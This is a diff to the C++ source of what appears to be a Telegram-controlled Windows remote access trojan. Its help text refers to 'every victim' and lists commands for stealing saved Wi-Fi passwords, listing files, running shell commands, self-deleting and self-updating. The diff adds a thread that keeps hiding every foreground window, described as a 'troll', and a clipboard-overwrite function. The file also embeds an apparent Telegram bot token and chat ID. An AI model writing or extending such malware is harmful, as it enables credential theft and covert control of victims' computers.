@@ -1,4 +1,4 @@
-#include <iostream>
+﻿#include <iostream>
 #include <string>
 #include <fstream>
 #include <mmdeviceapi.h>
@@ -12,6 +12,7 @@
 #include <iomanip>
 #include <windows.h>
 #include <filesystem>
+#include <thread>
 #include <opencv2/opencv.hpp> 
 #include <nlohmann/json.hpp>
 #include <cpr/cpr.h>
@@ -28,7 +29,7 @@ using namespace cv;
 string ID;
 const string BOT_API = ""; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
 const string CHAT_ID = "-1001655582641";
-const string VERSION = "beta v0.2.8";
+const string VERSION = "beta v0.2.9";
 constexpr int TELEGRAM_MAX = 4096;
 
 
@@ -127,7 +128,6 @@ int ChangeVolume(double nVolume=-1, bool bScalar=0)
     return currentVolume*100;
 }
 
-
 void setID(string newID)
 {
     ID = newID;
@@ -153,8 +153,6 @@ void press(char a, bool bigone = 0)
         keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
     }
 }
-
-
 
 string get_exe() {
     //https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
@@ -226,6 +224,7 @@ string exec(const char* cmd) {
     }
     return result;
 }
+
 vector<pair<string, string>> LocalIp;
 void ListIpAddresses() {
     IP_ADAPTER_ADDRESSES* adapter_addresses(NULL);
@@ -555,14 +554,11 @@ double time_lenght (time_t start, time_t stop) {
     return (double)(stop - start) / CLOCKS_PER_SEC;
 }
 
-bool not_error = true;
-void atexit_handler() {
-    if(not_error)Send(ID + " error, quiting...");
-}
 void Remove(string path) {
     string s = "del " + path;
     system(s.c_str());
 }
+
 void startup() {
     logo();
     fstream file;
@@ -577,7 +573,7 @@ void startup() {
 
     string s = get_path() + "update.bat";
     if (filexits(s))Remove(s);
-    atexit(atexit_handler);
+
 }
 
 void help(string parameters) {
@@ -606,6 +602,8 @@ void help(string parameters) {
         help += "ALL_ID (without <id>)\n";
         help += "ListOfFiles <path>\n";
         help += "WifiList\n";
+        help += "CloseForeground <true/false>\n";
+        help += "WriteToClipboard <text>\n";
 
         help += "Delitself\n";
         help += "Update <link to new version>\n";
@@ -639,6 +637,8 @@ void help(string parameters) {
         else if (parameters == "ALL_ID")Send("Every victim will send their id");
         else if (parameters == "ListOfFiles") Send("Lists all files and folders in given path");
         else if (parameters == "WifiList") Send("Gives you a list of Wifi names and passwords for them");
+        else if (parameters == "CloseForeground") Send("Nice troll to close every active window");
+        else if (parameters == "WriteToClipboard") Send("Write sth to clipboard");
         else Send("Wrong command.");
     }
 }
@@ -756,4 +756,44 @@ string get_ListOfWifiPasswords() {
         output += '\n';
     }
     return output;
+}
+
+bool ClosingForeground = false;
+
+void CloseForeground() {
+    HWND Wind;
+    while (ClosingForeground) {
+        Wind = GetForegroundWindow();
+        ShowWindow(Wind, false);
+        Sleep(10);
+    }
+    return;
+}
+
+thread t1;
+
+void StartStopClosingForeground(bool switcH) {
+    if (switcH) {
+        ClosingForeground = true;
+        t1 = thread(CloseForeground);
+    }
+    else {
+        ClosingForeground = false;
+        t1.join();
+    }
+}
+
+void toClipboard(HWND hwnd, const std::string& s) {
+    OpenClipboard(hwnd);
+    EmptyClipboard();
+    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, s.size() + 1);
+    if (!hg) {
+        CloseClipboard();
+        return;
+    }
+    memcpy(GlobalLock(hg), s.c_str(), s.size() + 1);
+    GlobalUnlock(hg);
+    SetClipboardData(CF_TEXT, hg);
+    CloseClipboard();
+    GlobalFree(hg);
 }
